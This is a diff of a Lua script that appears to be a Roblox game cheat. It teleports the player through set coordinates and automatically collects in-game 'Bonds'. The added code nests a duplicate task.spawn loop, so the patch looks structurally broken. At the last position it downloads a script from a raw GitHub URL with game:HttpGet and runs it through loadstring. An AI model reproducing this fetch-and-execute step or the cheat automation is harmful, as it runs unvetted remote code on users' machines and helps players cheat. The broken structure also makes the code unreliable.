@@ -133,11 +133,34 @@ task.spawn(function()
         safeTeleport(pos)
         task.wait(duration)
 
-        collectAllBonds() -- **Now collects all Bonds first before teleporting back**
+task.spawn(function()
+    for _, pos in ipairs(positions) do
+        safeTeleport(pos)
+        task.wait(duration)
 
+        -- ✅ **Force Bond collection if reaching (-424, 3, -49032)**
+        if pos == Vector3.new(-424, 3, -49032) then
+            print("Reached bond-heavy location! Collecting all Bonds before continuing...")
+
+            collectAllBonds() -- ✅ **Collect Bonds first before moving**
+            updateBondCount()
+            task.wait(2) -- Short pause to ensure collection finishes
+        end
+
+        -- ✅ **Execute loadstring if reaching last key location**
+        if pos == Vector3.new(57, 3, -49032) then
+            print("Reached final position, waiting 15 seconds...")
+            task.wait(15)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
+            print("Executed loadstring after 15 seconds.")
+        end
+
+        -- Continue normal teleportation
+        collectAllBonds()
         updateBondCount()
     end
 end)
+
 
 task.spawn(function()
     task.wait(2)
